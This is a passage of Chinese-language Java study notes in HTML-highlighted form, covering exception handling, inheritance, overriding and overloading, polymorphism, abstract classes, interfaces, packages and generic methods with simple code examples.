class="token keyword">try</span><span class="token punctuation">{</span>   <span class="token comment" spellcheck="true">// 程序代码</span><span class="token punctuation">}</span><span class="token keyword">catch</span><span class="token punctuation">(</span>异常类型<span class="token number">1</span> 异常的变量名<span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token comment" spellcheck="true">// 程序代码</span><span class="token punctuation">}</span><span class="token keyword">catch</span><span class="token punctuation">(</span>异常类型<span class="token number">2</span> 异常的变量名<span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token comment" spellcheck="true">// 程序代码</span><span class="token punctuation">}</span><span class="token keyword">catch</span><span class="token punctuation">(</span>异常类型<span class="token number">3</span> 异常的变量名<span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token comment" spellcheck="true">// 程序代码</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>上面的代码段包含了 3 个 catch块。</p><p>可以在 try 语句后面添加任意数量的 catch 块。</p><p>如果保护代码中发生异常，异常被抛给第一个 catch 块。</p><p>如果抛出异常的数据类型与 ExceptionType1 匹配，它在这里就会被捕获。</p><p>如果不匹配，它会被传递给第二个 catch 块。</p><p>如此，直到异常被捕获或者通过所有的 catch 块。</p><h3 id="throws-throw-关键字："><a href="#throws-throw-关键字：" class="headerlink" title="throws/throw 关键字："></a>throws/throw 关键字：</h3><p>如果一个方法没有捕获到一个检查性异常，那么该方法必须使用 throws 关键字来声明。throws 关键字放在方法签名的尾部。</p><p>也可以使用 throw 关键字抛出一个异常，无论它是新实例化的还是刚捕获到的。</p><p>下面方法的声明抛出一个 RemoteException 异常：</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>*<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">className</span><span class="token punctuation">{</span>  <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">deposit</span><span class="token punctuation">(</span><span class="token keyword">double</span> amount<span class="token punctuation">)</span> <span class="token keyword">throws</span> RemoteException  <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">// Method implementation</span>    <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">RemoteException</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token comment" spellcheck="true">//Remainder of class definition</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>一个方法可以声明抛出多个异常，多个异常之间用逗号隔开。</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>*<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">className</span><span class="token punctuation">{</span>   <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">withdraw</span><span class="token punctuation">(</span><span class="token keyword">double</span> amount<span class="token punctuation">)</span> <span class="token keyword">throws</span> RemoteException<span class="token punctuation">,</span>                              InsufficientFundsException   <span class="token punctuation">{</span>       <span class="token comment" spellcheck="true">// Method implementation</span>   <span class="token punctuation">}</span>   <span class="token comment" spellcheck="true">//Remainder of class definition</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="finally关键字"><a href="#finally关键字" class="headerlink" title="finally关键字"></a>finally关键字</h3><p>finally 关键字用来创建在 try 代码块后面执行的代码块。</p><p>无论是否发生异常，finally 代码块中的代码总会被执行。</p><p>在 finally 代码块中，可以运行清理类型等收尾善后性质的语句。</p><p>finally 代码块出现在 catch 代码块最后，语法如下：</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">try</span><span class="token punctuation">{</span>  <span class="token comment" spellcheck="true">// 程序代码</span><span class="token punctuation">}</span><span class="token keyword">catch</span><span class="token punctuation">(</span>异常类型<span class="token number">1</span> 异常的变量名<span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token comment" spellcheck="true">// 程序代码</span><span class="token punctuation">}</span><span class="token keyword">catch</span><span class="token punctuation">(</span>异常类型<span class="token number">2</span> 异常的变量名<span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token comment" spellcheck="true">// 程序代码</span><span class="token punctuation">}</span><span class="token keyword">finally</span><span class="token punctuation">{</span>  <span class="token comment" spellcheck="true">// 程序代码</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>注意事项：</strong></p><ul><li>catch 不能独立于 try 存在。</li><li>在 try/catch 后面添加 finally 块并非强制性要求的。</li><li>try 代码后不能既没 catch 块也没 finally 块。</li><li>try, catch, finally 块之间不能添加任何代码。</li></ul><h2 id="JAVA继承"><a href="#JAVA继承" class="headerlink" title="JAVA继承"></a>JAVA继承</h2><p>java的继承和C语言差不多，除了java的类不能多继承，但类可以多继承接口。</p><h2 id="继承关键字"><a href="#继承关键字" class="headerlink" title="继承关键字"></a>继承关键字</h2><p>继承可以使用 extends 和 implements 这两个关键字来实现继承，而且所有的类都是继承于 java.lang.Object，当一个类没有继承的两个关键字，则默认继承object（这个类在 <strong>java.lang</strong> 包中，所以不需要 <strong>import</strong>）祖先类。</p><h3 id="extends关键字"><a href="#extends关键字" class="headerlink" title="extends关键字"></a>extends关键字</h3><p>在 Java 中，类的继承是单一继承，也就是说，一个子类只能拥有一个父类，所以 extends 只能继承一个类。</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Animal</span> <span class="token punctuation">{</span>     <span class="token keyword">private</span> String name<span class="token punctuation">;</span>       <span class="token keyword">private</span> <span class="token keyword">int</span> id<span class="token punctuation">;</span>     <span class="token keyword">public</span> <span class="token function">Animal</span><span class="token punctuation">(</span>String myName<span class="token punctuation">,</span> String myId<span class="token punctuation">)</span> <span class="token punctuation">{</span>         name<span class="token operator">=</span> myName<span class="token punctuation">;</span>        id<span class="token operator">=</span> myId<span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//初始化属性值的具体实现</span>    <span class="token punctuation">}</span>     <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">eat</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token comment" spellcheck="true">//吃东西方法的具体实现  } </span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token comment" spellcheck="true">//睡觉方法的具体实现  } </span><span class="token punctuation">}</span> <span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Penguin</span>  <span class="token keyword">extends</span>  <span class="token class-name">Animal</span><span class="token punctuation">{</span>     <span class="token keyword">public</span> <span class="token function">Penguin</span><span class="token punctuation">(</span>String myName<span class="token punctuation">,</span>String myId<span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">super</span><span class="token punctuation">(</span>myName<span class="token punctuation">,</span> myId<span class="token punctuation">)</span>        <span class="token comment" spellcheck="true">//直接调用父类构造方法</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="implements关键字"><a href="#implements关键字" class="headerlink" title="implements关键字"></a>implements关键字</h3><p>使用 implements 关键字可以变相的使java具有多继承的特性，使用范围为类继承接口的情况，可以同时继承多个接口（接口跟接口之间采用逗号分隔）。</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">interface</span> <span class="token class-name">A</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">eat</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">public</span> <span class="token keyword">interface</span> <span class="token class-name">B</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">C</span> <span class="token keyword">implements</span> <span class="token class-name">A</span><span class="token punctuation">,</span>B <span class="token punctuation">{</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="super-与-this-关键字"><a href="#super-与-this-关键字" class="headerlink" title="super 与 this 关键字"></a>super 与 this 关键字</h3><p><strong>super</strong>关键字：我们可以通过super关键字来实现对父类成员的访问，用来引用当前对象的父类。</p><p><strong>super()</strong>函数：可以用于调用直接父类构造函数。</p><p>如果父类构造函数没有参数，则在子类的构造器中不需要使用 <strong>super</strong> 关键字调用父类构造器，系统会自动调用父类的无参构造函数。</p><p><strong>this</strong>关键字：指向本类的引用。</p><p><strong>PS：</strong>使用super调用父类函数中有this关键字时，this指向的不是本类（子类）的引用，不会改变本类的成员变量，也就是不会改变本类的状态。</p><p><strong>实例</strong></p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">class</span> <span class="token class-name">Animal</span> <span class="token punctuation">{</span>  <span class="token keyword">void</span> <span class="token function">eat</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"animal : eat"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">Dog</span> <span class="token keyword">extends</span> <span class="token class-name">Animal</span> <span class="token punctuation">{</span>  <span class="token keyword">void</span> <span class="token function">eat</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"dog : eat"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">void</span> <span class="token function">eatTest</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">eat</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment" spellcheck="true">// this 调用自己的方法</span>    <span class="token keyword">super</span><span class="token punctuation">.</span><span class="token function">eat</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">// super 调用父类方法</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Test</span> <span class="token punctuation">{</span>  <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>    Animal a <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Animal</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    a<span class="token punctuation">.</span><span class="token function">eat</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    Dog d <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Dog</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    d<span class="token punctuation">.</span><span class="token function">eatTest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>输出结果为：</p><pre><code>animal : eatdog : eatanimal : eat</code></pre><h3 id="final关键字"><a href="#final关键字" class="headerlink" title="final关键字"></a>final关键字</h3><p>final 关键字声明类可以把类定义为不能继承的，即最终类；或者用于修饰方法，该方法不能被子类重写：</p><ul><li><p>声明类：</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">final</span> <span class="token keyword">class</span> 类名 <span class="token punctuation">{</span><span class="token comment" spellcheck="true">//类体}</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>声明方法：</p><pre class="line-numbers language-java"><code class="language-java">修饰符<span class="token punctuation">(</span><span class="token keyword">public</span><span class="token operator">/</span><span class="token keyword">private</span><span class="token operator">/</span><span class="token keyword">default</span><span class="token operator">/</span><span class="token keyword">protected</span><span class="token punctuation">)</span> <span class="token keyword">final</span> 返回值类型 方法名<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token comment" spellcheck="true">//方法体}</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ul><p><strong>注</strong>:实例变量也可以被定义为 final，被定义为 final 的变量不能被修改。被声明为 final 类的方法自动地声明为 final，但是实例变量并不是 final</p><h3 id="继承的特性"><a href="#继承的特性" class="headerlink" title="继承的特性"></a>继承的特性</h3><ul><li>子类拥有父类非 private 的属性、方法。</li><li>子类可以拥有自己的属性和方法，即子类可以对父类进行扩展。</li><li>子类可以用自己的方式实现父类的方法。</li><li>Java 的继承是单继承，但是可以多重继承，单继承就是一个子类只能继承一个父类，多重继承就是，例如 A 类继承 B 类，B 类继承 C 类，所以按照关系就是 C 类是 B 类的父类，B 类是 A 类的父类，这是 Java 继承区别于 C++ 继承的一个特性。</li><li>提高了类之间的耦合性（继承的缺点，耦合度高就会造成代码之间的联系越紧密，代码独立性越差）。</li></ul><h2 id="Java-重写-Override-与重载-Overload"><a href="#Java-重写-Override-与重载-Overload" class="headerlink" title="Java 重写(Override)与重载(Overload)"></a>Java 重写(Override)与重载(Overload)</h2><h3 id="方法的重写规则"><a href="#方法的重写规则" class="headerlink" title="方法的重写规则"></a>方法的重写规则</h3><ul><li>参数列表与被重写方法的参数列表必须完全相同。</li><li>返回类型与被重写方法的返回类型可以不相同，但是必须是父类返回值的派生类（java5 及更早版本返回类型要一样，java7 及更高版本可以不同）。</li><li>访问权限不能比父类中被重写的方法的访问权限更低。例如：如果父类的一个方法被声明为 public，那么在子类中重写该方法就不能声明为 protected。</li><li>父类的成员方法只能被它的子类重写。</li><li>声明为 final 的方法不能被重写。</li><li>声明为 static 的方法不能被重写，但是能够被再次声明。</li><li>子类和父类在同一个包中，那么子类可以重写父类所有方法，除了声明为 private 和 final 的方法。</li><li>子类和父类不在同一个包中，那么子类只能够重写父类的声明为 public 和 protected 的非 final 方法。</li><li>重写的方法能够抛出任何非强制异常，无论被重写的方法是否抛出异常。但是，重写的方法不能抛出新的强制性异常，或者比被重写方法声明的更广泛的强制性异常，反之则可以。</li><li>构造方法不能被重写。</li><li>如果不能继承一个类，则不能重写该类的方法。</li></ul><h3 id="重载-Overload"><a href="#重载-Overload" class="headerlink" title="重载(Overload)"></a>重载(Overload)</h3><p>重载(overloading) 是在一个类里面，方法名字相同，而参数不同。返回类型可以相同也可以不同。</p><p>每个重载的方法（或者构造函数）都必须有一个独一无二的参数类型列表。</p><p>最常用的地方就是构造器（构造函数）的重载。</p><p><strong>重载规则:</strong></p><ul><li>被重载的方法必须改变参数列表(参数个数或类型不一样)；</li><li>被重载的方法可以改变返回类型；</li><li>被重载的方法可以改变访问修饰符；</li><li>被重载的方法可以声明新的或更广的检查异常；</li><li>方法能够在同一个类中或者在一个子类中被重载。</li><li><strong>无法以返回值类型作为重载函数的区分标准</strong>。（跟C语言类似）</li></ul><h2 id="Java-多态"><a href="#Java-多态" class="headerlink" title="Java 多态"></a>Java 多态</h2><h3 id="多态存在的三个必要条件"><a href="#多态存在的三个必要条件" class="headerlink" title="多态存在的三个必要条件"></a>多态存在的三个必要条件</h3><ul><li>继承</li><li>重写</li><li><strong>父类引用指向子类对象</strong>：<strong>Parent p = new Child();</strong> （关键点！！！）</li></ul><h2 id="虚函数"><a href="#虚函数" class="headerlink" title="虚函数"></a>虚函数</h2><p>虚函数的存在是为了多态。</p><p>Java 中其实没有虚函数的概念，它的普通函数就相当于 C++ 的虚函数，动态绑定是Java的默认行为。如果 Java 中不希望某个函数具有虚函数特性，可以加上 final 关键字变成非虚函数。</p><h3 id="重写"><a href="#重写" class="headerlink" title="重写"></a>重写</h3><p>当子类对象调用重写的方法时，调用的是子类的方法，而不是父类中被重写的方法。</p><p>要想调用父类中被重写的方法，则必须使用关键字 <strong>super</strong>。</p><p>（这也是为什么super()函数调用父类构造方法中有this时，不会改变子类的状态，它调用的是父类的引用，改变的是父类的状态，即使这个父类根本用不到）</p><h2 id="抽象方法"><a href="#抽象方法" class="headerlink" title="抽象方法"></a>抽象方法</h2><p>如果你想设计这样一个类，该类包含一个特别的成员方法，该方法的具体实现由它的子类确定，那么你可以在父类中声明该方法为抽象方法。</p><p>Abstract 关键字同样可以用来声明抽象方法，抽象方法只包含一个方法名，而没有方法体。</p><p>抽象方法没有定义，方法名后面直接跟一个分号，而不是花括号。</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">abstract</span> <span class="token keyword">class</span> <span class="token class-name">Employee</span><span class="token punctuation">{</span>   <span class="token keyword">private</span> String name<span class="token punctuation">;</span>   <span class="token keyword">private</span> String address<span class="token punctuation">;</span>   <span class="token keyword">private</span> <span class="token keyword">int</span> number<span class="token punctuation">;</span>   <span class="token keyword">public</span> <span class="token keyword">abstract</span> <span class="token keyword">double</span> <span class="token function">computePay</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment" spellcheck="true">//其余代码</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>声明抽象方法会造成以下两个结果：</p><ul><li>如果一个类包含抽象方法，那么该类必须是抽象类。</li><li>任何子类必须重写父类的抽象方法，或者声明自身为抽象类。</li></ul><p>继承抽象方法的子类必须重写该方法。否则，该子类也必须声明为抽象类。最终，必须有子类实现该抽象方法，否则，从最初的父类到最终的子类都不能用来实例化对象。</p><p><strong>就跟C语言差不多</strong></p><h2 id="Java-接口"><a href="#Java-接口" class="headerlink" title="Java 接口"></a>Java 接口</h2><p>接口（英文：Interface），在JAVA编程语言中是一个抽象类型，是抽象方法的集合，接口通常以interface来声明。一个类通过继承接口的方式，从而来继承接口的抽象方法。</p><p>接口并不是类，编写接口的方式和类很相似，但是它们属于不同的概念。类描述对象的属性和方法。接口则包含类要实现的方法。</p><p>除非实现接口的类是抽象类，否则该类要定义接口中的所有方法。</p><p>接口无法被实例化，但是可以被实现。一个实现接口的类，必须实现接口内所描述的所有方法，否则就必须声明为抽象类。另外，在 Java 中，接口类型可用来声明一个变量，他们可以成为一个空指针，或是被绑定在一个以此接口实现的对象。</p><h3 id="接口与类相似点："><a href="#接口与类相似点：" class="headerlink" title="接口与类相似点："></a>接口与类相似点：</h3><ul><li>一个接口可以有多个方法。</li><li>接口文件保存在 .java 结尾的文件中，文件名使用接口名。</li><li>接口的字节码文件保存在 .class 结尾的文件中。</li><li>接口相应的字节码文件必须在与包名称相匹配的目录结构中。</li></ul><h3 id="接口与类的区别："><a href="#接口与类的区别：" class="headerlink" title="接口与类的区别："></a>接口与类的区别：</h3><ul><li>接口不能用于实例化对象。</li><li>接口没有构造方法。</li><li>接口中所有的方法必须是抽象方法。</li><li>接口不能包含成员变量，除了 static 和 final 变量。</li><li>接口不是被类继承了，而是要被类实现。</li><li>接口支持多继承。</li></ul><h3 id="接口特性"><a href="#接口特性" class="headerlink" title="接口特性"></a>接口特性</h3><ul><li>接口和接口中每一个方法都是是隐式抽象的,接口中的方法会被隐式的指定为 <strong>public abstract</strong>（只能是 public abstract，其他修饰符都会报错）。</li><li>接口中可以含有变量，但是接口中的变量会被隐式的指定为 <strong>public static final</strong> 变量（并且只能是 public，用 private 修饰会报编译错误）。</li><li>接口中的方法是不能在接口中实现的，只能由实现接口的类来实现接口中的方法。</li></ul><h3 id="抽象类和接口的区别"><a href="#抽象类和接口的区别" class="headerlink" title="抽象类和接口的区别"></a>抽象类和接口的区别</h3><ul><li>1.抽象类中的方法可以有方法体，就是能实现方法的具体功能，但是接口中的方法不行。</li><li>2.抽象类中的成员变量可以是各种类型的，而接口中的成员变量只能是 <strong>public static final</strong> 类型的。</li><li>3.接口中不能含有静态代码块以及静态方法(用 static 修饰的方法)，而抽象类是可以有静态代码块和静态方法。</li><li>4.一个类只能继承一个抽象类，而一个类却可以实现多个接口。</li></ul><h3 id="标记接口"><a href="#标记接口" class="headerlink" title="标记接口"></a>标记接口</h3><p>最常用的继承接口是没有包含任何方法的接口。</p><p><strong>标记接口是没有任何方法和属性的接口.它仅仅表明它的类属于一个特定的类型,供其他代码来测试允许做一些事情。</strong></p><p>标记接口作用：简单形象的说就是给某个对象打个标（盖个戳），使对象拥有某个或某些特权。</p><p>例如：java.awt.event 包中的 MouseListener 接口继承的 java.util.EventListener 接口定义如下：</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">package</span> java<span class="token punctuation">.</span>util<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">interface</span> <span class="token class-name">EventListener</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>没有任何方法的接口被称为标记接口。标记接口主要用于以下两种目的：</p><ul><li><p>建立一个公共的父接口：</p><p>正如EventListener接口，这是由几十个其他接口扩展的Java API，你可以使用一个标记接口来建立一组接口的父接口。例如：当一个接口继承了EventListener接口，Java虚拟机(JVM)就知道该接口将要被用于一个事件的代理方案。</p></li><li><p>向一个类添加数据类型：</p><p>这种情况是标记接口最初的目的，实现标记接口的类不需要定义任何接口方法(因为标记接口根本就没有方法)，但是该类通过多态性变成一个接口类型。</p></li></ul><p><strong>通俗说法</strong>：</p><p>以Serializable接口为例。一个类实现了这个接口，说明它可以被序列化。因此，我们实际上通过Serializable这个接口，给该类标记了“可被序列化”的元数据，打上了“可被序列化”的标签。这也是标记/标签接口名字的由来。</p><p>一个类实现Serializable接口，使得我们可以用 <em>instanceof</em> 对类进行类型查询<em>,</em>例如：</p><p>​    <em>if(obj instanceof Serializable) {………}</em></p><h2 id="java包"><a href="#java包" class="headerlink" title="java包"></a>java包</h2><p>语法：</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">package</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>    <span class="token comment" spellcheck="true">//定义一个包（表明接下来定义的这个类、接口、枚举或注释在该包中）</span>例：    <span class="token keyword">package</span> net<span class="token punctuation">.</span>java<span class="token punctuation">.</span>util<span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//说明这个类在net.java.util这个包里</span><span class="token keyword">import</span> package1<span class="token punctuation">[</span><span class="token punctuation">.</span>package2…<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token punctuation">(</span>classname<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//引入一个包或类，使接下来可以直接使用这个包中的类</span>例：    <span class="token keyword">import</span> net<span class="token punctuation">.</span>java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>*<span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//引入net.java.util包中的所有类</span>    <span class="token keyword">import</span> net<span class="token punctuation">.</span>java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>Something<span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//引入net.java.util包中的Something类</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="package的目录结构"><a href="#package的目录结构" class="headerlink" title="package的目录结构"></a>package的目录结构</h3><p>类放在包中会有两种主要的结果：</p><ul><li>包名成为类名的一部分，正如我们前面讨论的一样。</li><li>包名必须与相应的字节码所在的目录结构相吻合。</li></ul><p>例如上面的 net.java.util这个包，它里面的类的java文件的路径就是：</p><p>\sources\net\java\util\ *.java</p><p>class文件的的路径就是：</p><p>\classes\net\java\util\ *.class</p><h2 id="泛型"><a href="#泛型" class="headerlink" title="泛型"></a>泛型</h2><h3 id="泛型方法（C语言中的模板）"><a href="#泛型方法（C语言中的模板）" class="headerlink" title="泛型方法（C语言中的模板）"></a>泛型方法（C语言中的模板）</h3><p>你可以写一个泛型方法，该方法在调用时可以接收不同类型的参数。根据传递给泛型方法的参数类型，编译器适当地处理每一个方法调用。</p><p>下面是定义泛型方法的规则：</p><ul><li>所有泛型方法声明都有一个类型参数声明部分（由尖括号分隔），<strong>该类型参数声明部分在方法返回类型之前</strong>（在下面例子中的<e>）。</e></li><li>每一个类型参数声明部分包含一个或多个类型参数，参数间用逗号隔开。一个泛型参数，也被称为一个类型变量，是用于指定一个泛型类型名称的标识符。</li><li>类型参数能被用来声明返回值类型，并且能作为泛型方法得到的实际参数类型的占位符。</li><li>泛型方法体的声明和其他方法一样。注意<strong>类型参数只能代表引用型类型，不能是原始类型</strong>（像int,double,char的等）。</li></ul><p><strong>实例：</strong></p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">GenericMethodTest</span><span class="token punctuation">{</span>   <span class="token comment" spellcheck="true">// 泛型方法 printArray                         </span>   <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token operator">&lt;</span> E <span class="token operator">></span> <span class="token keyword">void</span> <span class="token function">printArray</span><span class="token punctuation">(</span> E<span class="token punctuation">[</span><span class="token punctuation">]</span> inputArray <span class="token punctuation">)</span>   <span class="token punctuation">{</span>      <span class="token comment" spellcheck="true">// 输出数组元素            </span>         <span class="token keyword">for</span> <span class="token punctuation">(</span> E element <span class="token operator">:</span> inputArray <span class="token punctuation">)</span><span class="token punctuation">{</span>                    System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">printf</span><span class="token punctuation">(</span> <span class="token string">"%s "</span><span class="token punctuation">,</span> element <span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token punctuation">}</span>         System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span> String args<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">// 创建不同类型数组： Integer, Double 和 Character</span>        Integer<span class="token punctuation">[</span><span class="token punctuation">]</span> intArray <span class="token operator">=</span> <span class="token punctuation">{</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">5</span> <span class="token punctuation">}</span><span class="token punctuation">;</span>        Double<span class="token punctuation">[</span><span class="token punctuation">]</span> doubleArray <span class="token operator">=</span> <span class="token punctuation">{</span> <span class="token number">1.1</span><span class="token punctuation">,</span> <span class="token number">2.2</span><span class="token punctuation">,</span> <span class="token number">3.3</span><span class="token punctuation">,</span> <span class="token number">4.4</span> <span class="token punctuation">}</span><span class="token punctuation">;</span>        Character<span class="token punctuation">[</span><span class="token punctuation">]</span> charArray <span class="token operator">=</span> <span class="token punctuation">{</span> <span class="token string">'H'</span><span class="token punctuation">,</span> <span class="token string">'E'</span><span class="token punctuation">,</span> <span class="token string">'L'</span><span class="token punctuation">,</span> <span class="token string">'L'</span><span class="token punctuation">,</span> <span class="token string">'O'</span> <span class="token punctuation">}</span><span class="token punctuation">;</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span> <span class="token string">"整型数组元素为:"</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">printArray</span><span class="token punctuation">(</span> intArray  <span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 传递一个整型数组</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span> <span class="token string">"\n双精度型数组元素为:"</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">printArray</span><span class="token punctuation">(</span> doubleArray <span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 传递一个双精度型数组</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span> <span class="token string">"\n字符型数组元素为:"</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">printArray</span><span class="token punctuation">(</span> charArray <span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token 